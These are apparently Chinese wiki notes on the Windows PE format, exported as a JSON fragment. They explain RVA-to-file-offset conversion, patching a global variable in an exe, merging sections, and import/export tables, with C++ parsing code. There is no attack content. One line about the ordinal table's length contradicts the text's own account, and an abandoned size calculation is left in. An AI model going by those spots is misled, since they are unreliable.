用十六进制编译器查看xp系统下notepad的AddressOfEntryPoint和ImageBase字段。两者两加：01000000+0000739D=0100739D。随后用OD载入notepad，看OD停下的OEP是否是刚才算出的值。 3个地址之间的转换 虚拟地址（VA，Virtual Address)：PE文件映射到内存后的绝对地址 相对虚拟地址（RVA，Relative Virtual Address）：相对于基地址ImageBase的偏移量 映像基址/基地址（ImageBase）：PE文件在内存映像中的起始地址 文件偏移地址（FOA，File Offset Address）：相对于文件头的偏移量，文件头起始值为0 RVA和VA的转换 PE文件从内存中的ImageBase开始载入。VA-ImageBase得到的就是这个数据相对于ImageBase的偏移量 RVA=VA-ImageBase RVA和FOA的转换 RVA转FOA 计算方法一：算出该数据距离所在节的偏移，再加上节.PointerToRawData 如果文件对齐值和内存对齐值一样，同一数据在磁盘文件中的偏移和在内存中的偏移相同，就不用转换。 如果文件对齐和内存对齐值的不同，会出现FOA(文件偏移地址)和VA(虚拟地址)的转换问题。 因为PE文件中的区块有对齐要求 \\qquad=&gt;DOS+PE头+节表与第一个节的数据之间有填充；节数据与节数据之间有填充 \\qquad=&gt;DOS+PE头+节表，节数据内部没有填充 利用内部没有填充这一特点，我们算出某数据距离它所在节的偏移：某数据RVA-该数据所在节.VirtualAddress。 随后，该数据的FOA就是：该数据所在节.PointerToRawData+某数据距离它所在节的偏移 即某数据的FOA文件偏移 = 该数据所在节.PointerToRawData+（某数据的RVA–该数据所在节.VirtualAddress） 代码实现过程如下： 某数据RVA地址=VA内存地址-ImageBase地址 通过RVA地址判断是否位于PE头中： 如果是，那么RVA=FOA； 如果不是，通过该数据的RVA位于哪个节： 通过节.VirtualAddress ≤ RVA地址 ≤ 节.VirtualAddress+当前节内存对齐后的大小，来判断该数据在哪个节中 差值 = RVA地址-节.VirtualAddress FOA = 节.PointerToRawData+差值 计算方法二：用该数据RVA-所在节的节偏移（多填充的量） 通过节偏移Δk\\Delta kΔk=节.VirtualAddress-节.PointerToRawData来消除该节前面因为文件对齐值和内存对齐值不一致多出来的填充值。 例 假设，DOS+PE头+节表与第一个节的数据之间，节表一数据与节表二数据之间，在文件中它们的填充间隙总和为x： DOS+PE头+节表与第一个节的数据之间，节表一数据与节表二数据之间，在内存中它们的填充间隙总和为y。 那么节2.VirtualAddress-节2.PointerToRawData，就能算出y比x多填充的值。 随后，用某数据的RVA-多填充的值，就是某数据的FOA 例 已知全局变量的VA，通过PE文件来修改该全局变量的值 已初始化的全局变量在PE文件中有空间 1234567891011#include &quot;stdafx.h&quot;int g = 0x12345678;int main()&#123; printf(&quot;Address : %p &quot;, &amp;g); printf(&quot;value : 0x%x &quot;, g); return 0;&#125; 运行打印出的地址是变量g在进程4GB空间中的线性地址，虚拟地址VA 文件对齐值=内存对齐值文件对齐值≠内存对齐值查看FileAlignment文件对齐和SectionAlignment内存对齐值，发现都是0x1000h 查该exe的ImageBase，为00400000。则RVA=00424A30-00400000=00024A30 因为文件对齐值=内存对齐值，所以FOA和RVA一样，去00024A30找这个值，修改这个值为0x77777777，然后重新运行exe。 如果编译出的exe文件对齐和内存对齐一样，用LordPE对exe进行重建PE，把它们弄成不一样的打开LordPE，点击重建PE，选择Test.exe，PE重建功能中有压缩文件大小的功能，这里的压缩就是修改磁盘文件的对齐值，避免过多地因对齐而进行补0，使其少占用磁盘空间。重建后的文件对齐是200h，内存对齐是1000h。用VScode编译我用VScode编译出的exe，FileAlignment是200h，SectionAlighment是1000h。 查该exe的ImageBase，为00400000。则RVA=00424A30-00400000=00024A30 PE工具看各个区段的VirtualAddress，看出数据在.data区块。 数据相对.data区块开头的偏移量为：00024A30-00024000=A30 .data的ROffset是11C00，+A30=12630h。 去12630h找这个值，修改这个值为0x88888888，然后重新运行exe。"},{"title":"合并节","path":"/wiki/PE/合并节.html","content":"现有节表后没空位新添一个节表的信息，Dos Stub也没有可利用的空间，可以用合并节。这里的合并节是合并节表中信息，并没有实际移动节数据的位置。 步骤 以将所有节合并为一个节为例： 修改第一个节的字段 VirtualAddress：不用改 PointerToRawData：不用改 Misc.VirtualSize和SizeOfRawData改成一样的，都改成按内存对齐的大小 通用计算方式： 计算方式一：VirtualSize = SizeOfImage - 第一个节的VirtualAddress 计算方式二：最后一个节的VirtualAddress + max{VirtualSize，SizeOfRawData} - SizeOfHeader按内存对齐后的大小 SizeOfImage的大小≥最后一个节.VirtualAddress+max{Misc,SizeOfRawData}按内存对齐后的值 SizeOfHeader按内存对齐后的大小其实就是第一个节的VirtualAddress。 计算方式二和计算方式一是一样的，在编程时用方式一就不需要最后一个节的节表指针 当文件对齐=内存对齐时 特殊的计算方法：SizeOfImage-SizeOfHeader（其实就是第一个节的VirtualAddress） Characteristics：修改为所有节属性或起来的结果。因为合并成一个节了，这个节要满足合并前所有节的属性。 （可选）将其他节表信息置0 修改节表数量为1 编程实现 通过前面的练习已经知道：SizeOfImage的大小≥最后一个节.VirtualAddress+max{Misc,SizeOfRawData}按内存对齐后的值。所以直接在ImageBuffer上将节表信息合并，然后ImageBuffer-&gt;FileBuffer，然后存盘 之前想着还要不要用最后一个节.VirtualAddress+max{Misc,SizeOfRawData}按内存对齐后的值来申请空间，其实File-&gt;Image时，PE的SizeOfImage已有这层意思了 12345678910111213141516171819202122232425262728293031VOID PEManipulator::MergeAllSections()&#123; PEHeaders ImagePEHeaders&#123; nullptr &#125;; if (!ExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders)) &#123; printf(&quot; [!] (In %s) Extract the PE Pointers of NewImageBuffer failed &quot;, __func__); return; &#125; printf(&quot; [+] Extract the PE Pointers of NewImageBuffer successfully. &quot;); if (!ImagePEHeaders.DosHdr || !ImagePEHeaders.NtHdr || // 检查所有PEHeaders成员是否有效，避免编译器警告 !ImagePEHeaders.PeHdr || !ImagePEHeaders.OptionalPeHdr || !ImagePEHeaders.SecHdr) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return; &#125; //更新第一个节的节表信息 PIMAGE_SECTION_HEADER pSecHdrToFirstSection = ImagePEHeaders.SecHdr; pSecHdrToFirstSection-&gt;Misc.VirtualSize = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage - pSecHdrToFirstSection-&gt;VirtualAddress; pSecHdrToFirstSection-&gt;SizeOfRawData = pSecHdrToFirstSection-&gt;Misc.VirtualSize; for (int i = 1; i &lt; ImagePEHeaders.PeHdr-&gt;NumberOfSections; i++) &#123; pSecHdrToFirstSection-&gt;Characteristics |= ImagePEHeaders.SecHdr[i].Characteristics; &#125; // 3. 更新节表数量为1 ImagePEHeaders.PeHdr-&gt;NumberOfSections = 1; printf(&quot; [+] All sections have been merged into the first section successfully. &quot;);&#125; 测试： 12345678910111213141516171819202122232425//测试合并节int TestMergeAllSections()&#123; //用例1：fg.exe 文件对齐=内存对齐 //PEManipulator PEFile(&quot;E:\\\\temp\\\\MergeAllSections\\\\fg.exe&quot;); //用例2：notepad.exe 文件对齐200h 内存对齐1000h PEManipulator PEFile(&quot;E:\\\\temp\\\\MergeAllSections\\ otepad.exe&quot;); if (!PEFile.MapPEFile()) &#123; return 1; &#125; if (!PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.FileBufferToImageBuffer(); PEFile.MergeAllSections(); PEFile.ImageBufferToNewFileBuffer(); if (!PEFile.SaveFile(3)) &#123; return 1; &#125; return 0;&#125;"},{"title":"导入表","path":"/wiki/PE/导入表.html","content":"前言 一个PE文件的导入表中记录了当前PE文件运行时需要用到哪些PE文件，用到那个PE文件中的哪些函数。 比如fg.exe的导入表指出，运行时需要用到kernel32.dll，user32.dll等dll。其中，要用到kernel32.dll中CreateProcess，ExitProcess等函数。 导入的dll如果也有导入表，系统加载器会递归地继续加载它所依赖的dll，直到所有的依赖都被加载到进程空间为止。 我们写一段示例代码，观察下自己写的普通函数和导入函数在反汇编上调用代码的区别。 VCdebug模式编译1234567891011121314#include &lt;Windows.h&gt;int Fun(int x, int y)&#123; return x + y;&#125;int main()&#123; int r = Fun(1, 2); MessageBox(0, 0, 0, 0); return 0;&#125; Fun，代表自己写的普通函数MessageBox，代表导入的函数直接调用，写死的地址，直接call，call过去 用的call是间接调用，调用42A2ACh里存的那个数 现在我们看看在文件中42A2ACh，这块地址里存的内容是什么。这是运行时的PE，将42A2ACh减去400000h（ImageBase）得到2A2ACh（RVA），RVA转FOA得到（过程略）282ACh。用十六进制编辑器找过去，看到282ACh存的不是上面OD看到的函数地址757B15F0h。而是00022ADCh这么一个数（后面会提，这个值是个RVA，转FOA后找过去，找到的是提示名表Hint-name Table，会找到MessageBoxA函数名）。 这一块是IAT表的知识，后面会提。通过这个实验可以先粗浅地得知： PE文件加载前，42A2ACh这里是一个指向提示名表Hint-name的RVA地址，提示名表中记录了导入函数的名字。 PE文件加载后，42A2ACh这里会被替换成MessaBoxA的实际地址 （由一堆42A2ACh这样的地址组成的就是IAT表，在文件时IAT表表项指向提示名表Hint-name Table，在模块载入后，IAT表中的表项会由系统加载器替换为导入函数的函数地址）。 导入表 从拓展PE头.数据目录表数据的第2个成员得到导入表的起始地址（这个值是RVA）和大小。 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 将RVA转为FOA后，找过去，是第一个导入表的起始位置。导入表由一堆IMAGE_IMPORT_DESCRIPTOR（IID）类型的结构体数组组成。 1234567891011typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; DWORD OriginalFirstThunk; // 指向INT表的RVA地址 &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; // 时间戳 DWORD ForwarderChain; // 不使用 DWORD Name; // 指向导入的DLL名，RVA地址 DWORD FirstThunk; // 指向IAT表的RVA地址&#125; IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; 以全0的IMAGE_IMPORT_DESCRIPTOR结构体作为结束标志。 OriginalFirstThunk：一个指向导入名称表（INT，Import Name Table）的RVA地址。 TimeDateStamp：时间戳，可以忽略。 ForwarderChain：没啥用 这是第1个被转向的API的索引，一般为0，在程序引用一个DLL中的API, 而这个API又在引用其他DLL的API时使用(但这样的情况很少出现)。《加密与解密4th》P423 Name：指向一个以’\\0’结尾的ASCII字符串，这个值是RVA。指向的字符串是导入的DLL名字，例如Kernel32.dll，User32.dll。 FirstThunk：一个指向导入地址表（IAT，Import Address Table）的RVA地址。 数据目录表的第13项直接指向了IAT表的RVA地址，通过这个也能直接找到IAT表。 INT表是一个IMAGE_THUNK_DATA结构的数组，IAT表也是一个IMAGE_THUNK_DATA结构的数组。它们都是以全0的IMAGE_THUNK_DATA结构体作为结束标志。 在PE文件运行前INT表和IAT表的内容完全一样。假设OriginalFirstThunk指向的INT表在文件的位置A，FirstThunk指向的IAT表在文件的位置B，它们位置不同，但是INT表和IAT表的内容完全一样。且都指向同一份提示名表（Hint-name Table）。 PE32PE32+123456789typedef struct _IMAGE_THUNK_DATA32 &#123; union &#123; DWORD ForwarderString; DWORD Function; DWORD Ordinal; // 序号 DWORD AddressOfData; // 指向PIMAGE_IMPORT_BY_NAME，是一个RVA地址 &#125; u1;&#125; IMAGE_THUNK_DATA32;typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;123456789typedef struct _IMAGE_THUNK_DATA64 &#123; union &#123; ULONGLONG ForwarderString; // PBYTE ULONGLONG Function; // PDWORD ULONGLONG Ordinal; ULONGLONG AddressOfData; // PIMAGE_IMPORT_BY_NAME &#125; u1;&#125; IMAGE_THUNK_DATA64;typedef IMAGE_THUNK_DATA64 * PIMAGE_THUNK_DATA64; IMAGE_THUNK_DATA是个联合结构，联合结构占的空间取决于联合结构中最宽的那个成员。PE32是DWORD大小。 当这个DWORD值最高位为1时，表示函数以序号方式导入。此时低31位是一个函数序号。 当这个DWORD值最高位为0时，表示函数以函数名方式导入。此时这个DWORD值是一个指向IMAGE_IMPORT_BY_NAME结构的RVA地址。 有时被称为提示名表（Hint-name Table）1234typedef struct _IMAGE_IMPORT_BY_NAME &#123; WORD Hint; CHAR Name[1];&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; Hint：这个导入函数在其所驻留DLL输出表中的序号（这个序号不等于导出函数的导出序号，是导出序号-Base后的值），可以直接拿这个序号当数组索引去导出函数地址表查表。 不过Hint这个值可能不准确。因为是这样的，根据IAT表更新的过程可以知道：先查到INT表， INT表里的值如果高位为0，表示是名字方式导入，这时才会继续找到IMAGE_IMPORT_BY_NAME结构。那通过名字去查导出表获得函数地址呗，不用关心这个序号了。 而INT表里的值如果高位为1，表示是序号导出，那直接拿序号去查地址表了，没有后续的IMAGE_IMPORT_BY_NAME结构了。 hint在英文中是提示的意思 Name：导入函数的函数名。这个函数名是一个以’\\0’结尾的ASCII字符串。因为函数名长度不定，这里结构体中用的CHAR（一个字节）的数据类型来表示。在实际用这个名字时要遍历到’\\0’结尾。 小结 通过数据目录表第2项的RVA地址，可找到一张张的导入表。每个导入表描述一个要导入的dll文件。每个IID结构中分别有OriginalFirstThunk指向INT表，有FirstThunk指向IAT表。在INT表和IAT表中，描述了要导入这个dll中的哪些函数（包括函数名描述和序号描述）。 在PE文件运行前，INT表和IAT表存在文件中的不同位置，但INT表和IAT表的内容一样。当PE文件运行后，IAT表的内容会被由系统加载器替换为实际的函数地址，替换的步骤如下： 读取IID的Name成员，获取库名称字符串(“kernel32.dll”)。 装载相应库 →LoadLibrary(“kernel32.dll”) 读取IID的OriginalFirstThunk成员，获取INT地址。 逐一读取INT中数组的值，获取相应IMAGE_IMPORT_BY_NAME地址(RVA) 。 使用IMAGE_IMPORT_BY_NAME的Hint(ordinal)或Name项，获取相应函数的起始地址。 →GetProcAddress(“GetCurrentThreadld”) 根据IID的FirstThunk (IAT)成员，获得IAT地址 用上面获得的函数地址替换相应IAT数组中的值 重复以上步骤4~7，直至遍历所有INT结束（遇到NULL时） 《逆向核心工程原理》P108 从一个PE文件装载过程说起的话便是： 双击一个exe 系统加载器将exe以拉伸态贴到进程空间的ImageBase处 遍历exe的导入表逐一将dll以拉伸态贴到进程空间的ImageBase处 某些dll预设的ImageBase可能被其他dll占了，那么这个dll会加载到其他基址，并按重定位表修复重定位数据 替换IAT表内容：通过遍历导入表-INT表去dll获取导出函数地址，替换IAT表内容 PE文件加载前PE文件加载后 下面示意图中名称提示表Hint-name Table看起来好像是要连续的。实际上它们之间可以有缝隙放些其他内容，但一般情况下它们中间没缝隙。编程时名称提示表的每一项都是由INT表或IAT表表项找过去的。 程序中调用导入函数都是间接调用，指向IAT表。当系统加载器完成IAT表表项函数地址的更新后，这些间接调用就能正确调用到导入函数了。 程序中调用导入函数的汇编指令可能是 1234\tcall 00401164\t……:00401164\tjmp dword ptr [00402010]\t;指向User32.LoadIconA函数 或 1call dword ptr [00402010]\t;指向User32.LoadIconA函数 （上面画图只画了其中一种情况） Q&amp;A 导入函数的地址为什么要用间接调用的方式，而不是像普通函数那样直接将地址写死？直接写死效率不是更高吗（间接调用要先去取目标内存里的值，然后才调用，先比于直接调用会花费更多的执行时间）？ 答：用间接调用的方式是因为导入函数的函数地址在PE文件加载后才能确定，这有两方面的因素： Windows引入了DLL是为了模块化。一个exe+多个dll，哪个模块有问题改那个模块的dll即可。当notepad.exe在不同的操作系统下运行，不同操作系统版本的kernel32.dll版本各不相同，CreateFileW函数的位置（地址）也不相同。目标导入函数地址只能在执行文件时由PE加载器填充后才知道。 DLL重定位：DLL文件加载进进程空间时可能发生重定位，只有当目标DLL加载完了+修复完重定位数据后才能确定函数地址。 只有IAT表不就好了，根据IAT表指向名称提示表，然后更新IAT表为导入函数的函数地址，随后就能正常使用了。为什么还要额外的INT表？ 答： 留一份作为备份。当IAT表都更新为导入函数的实际地址后，万一什么时候出错了，还可以根据INT表修复IAT表里的内容。 IAT表更新为导入函数的实际地址后。此时还有一份INT表，就能知道IAT表里的函数地址对应的函数名是什么。 打印导入表 分别打印导入表各个字段、INT表、IAT表 这里注意下打印IAT表时要分情况： 导入表.TimeDateStamp时间戳 = 0xFFFFFFFF，表示IAT表已绑定地址。绑定时间为绑定导入表IMAGE_BOUND_IMPORT_DESCRIPTOR的TimeDateStamp字段（这是绑定导入表的知识） 导入表.TimeDateStamp时间戳 = 0，表示IAT表未绑定地址，此时IAT表和INT表内容一样 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113VOID PEManipulator::PrintImpotrTable()&#123; auto pImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_IMPORT); if (!pImportDirectory) &#123; return; &#125; int Index = 0; // 第几个导入表 while (pImportDirectory-&gt;OriginalFirstThunk &amp;&amp; pImportDirectory-&gt;FirstThunk) //重要成员为0时结束循环 &#123; //打印导入表各个字段 printf(&quot; %d. Image Import Descriptor: &quot;, Index++); printf(&quot; OriginalFirstThunk: 0x%08X &quot;, pImportDirectory-&gt;OriginalFirstThunk); printf(&quot; TimeDateStamp: 0x%08X &quot;, pImportDirectory-&gt;TimeDateStamp); printf(&quot; ForwarderChain: 0x%08X &quot;, pImportDirectory-&gt;ForwarderChain); DWORD dwNameFOA = 0; if (!RVAToFOA(pImportDirectory-&gt;Name, dwNameFOA)) &#123; return; &#125; auto cModuleName = (PCHAR)((DWORD)m_lpFileBuffer + dwNameFOA); printf(&quot; Name: 0x%08X (\\&quot;%s\\&quot;) &quot;, pImportDirectory-&gt;Name, cModuleName); printf(&quot; FirstThunk: 0x%08X &quot;, pImportDirectory-&gt;FirstThunk); //打印INT表 DWORD dwOriginalFirstThunk_FOA = 0; if (!RVAToFOA(pImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA)) &#123; return; &#125; auto pINTTable = (PDWORD)((DWORD)m_lpFileBuffer + dwOriginalFirstThunk_FOA); printf(&quot; INT Table： &quot;); // 对齐表头 printf(&quot;\\t Thunk RVA Thunk FOA Thunk Value ----------------&gt; Hint API Name &quot;); printf(&quot;\\t ----------- ----------- ------------ ---------- ------------ &quot;); while (*pINTTable) &#123; if (IMAGE_SNAP_BY_ORDINAL(*pINTTable)) //最高位为1，序号方式输入 &#123; printf(&quot;\\t 0x%08X 0x%08X 0x%08X Original:0x%08X - - &quot;, pImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA, *pINTTable, *pINTTable &amp; 0x7fff); &#125; else //最高位为0，函数名方式输入 &#123; DWORD dwHintNameTable_FOA = 0; if (!RVAToFOA(*pINTTable, dwHintNameTable_FOA)) &#123; return; &#125; auto pHintNameTable = (PIMAGE_IMPORT_BY_NAME)((DWORD)m_lpFileBuffer + dwHintNameTable_FOA); printf(&quot;\\t 0x%08X 0x%08X 0x%08X 0x%04X %s &quot;, pImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA, *pINTTable, pHintNameTable-&gt;Hint, (PCHAR)pHintNameTable-&gt;Name); &#125; ++pINTTable; &#125; //打印IAT表 DWORD dwFirstThunk_FOA = 0; if (!RVAToFOA(pImportDirectory-&gt;FirstThunk, dwFirstThunk_FOA)) &#123; return; &#125; auto pIATTable = (PDWORD)((DWORD)m_lpFileBuffer + dwFirstThunk_FOA); printf(&quot; IAT Table： &quot;); if (pImportDirectory-&gt;TimeDateStamp == 0xFFFFFFFF) //时间戳 = 0xFFFFFFFF，IAT表已绑定地址 &#123; // 对齐表头 printf(&quot;\\t Thunk RVA Thunk FOA Thunk Value &quot;); printf(&quot;\\t ----------- ----------- ------------ &quot;); while (*pIATTable) &#123; printf(&quot;\\t 0x%08X 0x%08X 0x%08X Func Address:0x%08X &quot;, pImportDirectory-&gt;FirstThunk, dwFirstThunk_FOA, *pIATTable, *pIATTable); ++pIATTable; &#125; &#125; else if (pImportDirectory-&gt;TimeDateStamp == 0) //时间戳 = 0，IAT表未绑定地址，和INT表内容一样 &#123; // 对齐表头 printf(&quot;\\t Thunk RVA Thunk FOA Thunk Value ----------------&gt; Hint API Name &quot;); printf(&quot;\\t ----------- ----------- ------------ ---------- ------------ &quot;); while (*pIATTable) &#123; if (IMAGE_SNAP_BY_ORDINAL(*pIATTable)) //最高位为1，序号方式输入 &#123; printf(&quot;\\t 0x%08X 0x%08X 0x%08X Original:0x%08X - - &quot;, pImportDirectory-&gt;FirstThunk, dwFirstThunk_FOA, *pIATTable, *pIATTable &amp; 0x7fff); &#125; else //最高位为0，函数名方式输入 &#123; DWORD dwHintNameTable_FOA = 0; if (!RVAToFOA(*pIATTable, dwHintNameTable_FOA)) &#123; return; &#125; auto pHintNameTable = (PIMAGE_IMPORT_BY_NAME)((DWORD)m_lpFileBuffer + dwHintNameTable_FOA); printf(&quot;\\t 0x%08X 0x%08X 0x%08X 0x%04X %s &quot;, pImportDirectory-&gt;FirstThunk, dwFirstThunk_FOA, *pIATTable, pHintNameTable-&gt;Hint, (PCHAR)pHintNameTable-&gt;Name); &#125; ++pIATTable; &#125; &#125; ++pImportDirectory; //下一个导入表 &#125;&#125;"},{"title":"导出表","path":"/wiki/PE/导出表.html","content":"前言 一个exe的进程空间由多个模块组成。用OD打开fg.exe，点击按钮E，可以看到进程空间中所有的模块。双击运行fg时，fg如何知道需要加载哪些模块到自己的进程空间中？ 导入表：记录当前PE文件需要用到的其他PE文件有哪些，以及用到了其他PE文件中的哪些函数 导出表：存储当前PE文件提供了哪些函数给别人用，函数的地址是多少 一般情况下，dll提供函数给别人用（有导出表），exe用别人提供的函数（没导出表）。但实际上，exe和dll都是PE文件，都可以提供函数给别人用，都可以有导出表。 本小节讲解导出表，从拓展PE头数据目录表数据的第一个成员得到导出表的起始地址（这个值是RVA）和大小。 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 这个Size是算上导出表IMAGE_EXPORT_DIRECTORY结构体+其子表一共占用的空间，单论IMAGE_EXPORT_DIRECTORY结构体的大小是40个字节。 Size这个值是编译器编译后填写的值，没有实际意义。导出表有自己的格式结构体字段来找到它的数据，这个Size说是改掉也可以，不影响执行，但俺还没试过 导出表 1234567891011121314typedef struct _IMAGE_EXPORT_DIRECTORY&#123; DWORD Characteristics; // 未使用 DWORD TimeDateStamp; // 时间戳，表示当前PE文件（DLL）编译时的时间 WORD MajorVersion; // 未使用 WORD MinorVersion; // 未使用 DWORD Name; // 当前导出表文件名（字符串）的起始地址，是个RVA值 DWORD Base; // 导出函数起始序号，用于计算导出函数的实际序号 DWORD NumberOfFunctions; // 所有导出函数的个数，包括具名和匿名函数 DWORD NumberOfNames; // 具名导出函数的个数 DWORD AddressOfFunctions; // 导出函数地址表的起始地址，是个RVA值 DWORD AddressOfNames; // 导出函数名称表的起始地址，是个RVA值 DWORD AddressOfNameOrdinals; // 导出函数序号表的起始地址，是个RVA值&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; Characteristics：未使用，总是为0 TimeDateStamp：时间戳，当前DLL文件编译时的时间 GMT时间（当前时间与1970年01月01日00时00分00秒差的秒数）。 标准PE中的TimeDateStamp字段和这个一样，都是记录当前PE文件什么时候生成的。 MajorVersion：输出表的主版本号，未使用，设置为0 MinorVersion：输出表的次版本号，未使用，设置为0 Name：指向一个以’\\0’结尾的ASCII字符串，这个值是RVA。指向的字符串是当前导出表文件的名字（如Kernel32.dll）。 辅助信息，可以修改。 Base：导出函数的起始序号，也就是.def中最小的导出序号。 使用导出序号查询导出函数函数地址的过程：先用导出序号-Base（起始序号），用减后的数字作为索引去导出函数地址表查表得到导出函数的函数地址。 NumberOfFunctions：当前PE文件中一共有多少个导出函数，这个数除了真实有的函数地址，还包括空缺补位。 这个字段的值=导出函数中序号最大的-导出函数中序号最小的+1。比如写dll时.def序号最小是11，最大是15，那么一共有15-11+1=5个。（不是那么准确，具体见这篇文章） NumberOfNames：有名导出函数的个数，包括函数别名。 AddressOfFunctions：导出函数地址表的起始地址，是个RVA值。 AddressOfFunctions指向了一张表，这张表里存储了该PE文件中所有导出函数的函数地址。32位下函数地址宽度为4字节。 导出函数地址表（EAT，Export Address Table）：数组，里面存的是所有导出函数的函数地址。未使用的导出序号在这个表项目中对应的元素为0。数组个数由NumberOfFunctions确定。 AddressOfNames：导出函数名称表的起始地址，是个RVA值。 AddressOfNames指向了一张表，表里存的是RVA地址（32位下地址宽度为4字节），这个地址指向以’\\0’作为结束符的ASCII字符串。所有导出函数函数名和别名的字符串地址都在这个表中。 表中存的字符串地址按字符串名称从小到大排序了，小的字符串的地址在前面。比如导出函数名有Plus，Mul，Div，那么在这个表中存的顺序依次是Div字符串的地址，Mul字符串的地址，Plus字符串的地址。数组个数由NumberOfNames确定。 导出函数名称表（ENT， Export Name Table）：数组，里面存的是个RVA地址，每个地址均指向以’\\0’作为结束符的ASCII字符串，这个字符串是具名导出函数的函数名称或别名。 AddressOfNameOrdinals：导出函数序号表的起始地址，是个RVA值。 导出函数序号表（EOT，Export Ordinal Table，通常称为Ordinal Table）：数组，每个成员大小2个字节，存的是导出函数的序号，这个序号+Base后才是.def里导出序号的值。 导出函数地址表（EAT，Export Address Table） 起始地址：由AddressOfFunctions指出，这个值是个RVA 数据结构：地址数组，存的是所有导出函数的RVA函数地址，加上ImageBase才是真正的函数地址。 元素大小：4字节，一个地址 内容：元素为非0的，是某个导出函数的函数地址；未使用的导出序号在这个地址数组中对应的元素为0 数组个数：由NumberOfFunctions确定 导出函数名称表（ENT， Export Name Table） 起始地址：由AddressOfNames指出，这个值是个RVA 数据结构：地址数组 元素大小：一个地址，32位下地址宽度为4字节 内容：每个元素都是一个地址，每个地址都是一个指向以’\\0’作为结束符的ASCII字符串。这个字符串是导出函数的函数名和别名 有顺序：按名称大小排序，小的字符串的地址在前面。比如导出函数有Plus，Mul，Div，那么在这个表中存的字符串地址顺序依次是Div字符串的地址，Mul字符串的地址，Plus字符串的地址 数组个数：由NumberOfNames确定 函数名字这个字符串在文件中的位置是不确定的；而名称表中字符串地址是按字符串大小排序的。也就是说，函数名为Axx开头的字符串地址在名称表中排前面，而Axx这个函数名，在文件中存放的位置可能比Bxx这个函数名的地址高 导出函数序号表（EOT，Export Ordinal Table，通常称为Ordinal Table） 起始地址：由AddressOfNameOrdinals指出，这个值是个RVA 数据结构：数组，该数组存的是导出函数的序号 元素大小：2字节，一个数 内容：每个元素都是一个序号 数组个数：导出函数名称表有几项，这个表就有几项，也就是NumberOfFunctions个 地址表和名称表哪个表的项数多？不一定，一个函数地址，可能有多个不同的名字，本名+别名。这这种情况下，名称表个数会&gt;地址表个数。但实际尝试下来发现名称表个数没法&gt;地址表个数，具体见这篇文章。 例 用VC编译如下代码（debug下）得到本小节中演示的dll。（VC编译出的dll文件对齐和内存对齐都是1000h，免去RVA转FOA的计算） ArithmeticOperations.h123456#pragma onceint __stdcall Plus(int x, int y);int __stdcall Sub(int x, int y);int __stdcall Mul(int x, int y);int __stdcall Div(int x, int y);Source.def1234567LIBRARYEXPORTS Plus @12\tSub @16 NONAME\tMul @13\tDiv @17 ArithmeticOperations.cpp123456789101112131415161718#include &quot;ArithmeticOperations.h&quot;int __stdcall Plus(int x, int y)&#123;\treturn x + y;&#125;int __stdcall Sub(int x, int y)&#123;\treturn x - y;&#125;int __stdcall Mul(int x, int y)&#123;\treturn x * y;&#125;int __stdcall Div(int x, int y)&#123;\treturn x / y;&#125; 根据数据目录表找到导出表的RVA为：0002DF10h，大小为179h。 179h计算来源：（上一个编译的dll的大小是179h，想试算看这个大小试怎么得到的。即使算上函数前后的int 3，离这个数还是远远不够，遂放弃。这里是遗留下的草稿） IMAGE_EXPORT_DIRECTORY结构体，40个字节； Name指向的子表大小，从0002DF5Eh起到2df67h，大小为10个字节； AddressOfFunctions指向的子表大小，从0002DF38h起到0002DF4bh，20个字节；每项是个函数地址，还要算上这段函数硬编码占的空间，jmp+真正的函数，Plus函数占5字节（jmp）+39（函数内容）=44字节，Mul函数占5+40=45字节，Sub函数占5+39=44字节，Div函数占5+40=45字节；一共20+44+45+44+45=198字节 AddressOfNames指向的子表大小，从0002DF4Ch起到0002DF57h，12个字节；表项指向的字符串占的空间，从0002DF68h到0002DF70h，13个字节；一共25个字节； AddressOfNameOrdinals指向的子表大小，从0002DF58h起到0002DF5dh，6个字节。 一共40+10+?+25+6=267= 81+?=377 179h=377d 差296字节-20=276/4=69？ 字段 值 DWORD Characteristics 0h DWORD TimeDateStamp 662B6D63h WORD MajorVersion 0h WORD MinorVersion 0h DWORD Name 0002DF62h DWORD Base Ch DWORD NumberOfFunctions 6 DWORD NumberOfNames 3 DWORD AddressOfFunctions 0002DF38h DWORD AddressOfNames 0002DF50h DWORD AddressOfNameOrdinals 0002DF5Ch Name字段的值是0002DF62h，这个值是一个字符串的起始地址，找过去开始读，以0结尾，名字是“MyDll.dll”。（俺用VC编译时工程名是MyDll.dll，拖到实体机后改名改为MyDll_VC.dll的） 导出函数地址表 AddressOfFunctions字段的值是0002DF38h，这个值是导出函数地址表的起始地址，这个地址表每一项大小是4字节，找过去，表项的数量是NumberOfFunctions个，得到导出函数地址表如下： 序号 表项的内容 0 00001014h 1 0000100Ah 2 00000000h 3 00000000h 4 0000100Fh 5 00001005h （序号2和3是空缺位，补0，因为前面的.def文件用的序号不连续，没用到序号14和序号15） Source.def1234567LIBRARYEXPORTS Plus @12\tSub @16 NONAME\tMul @13\tDiv @17 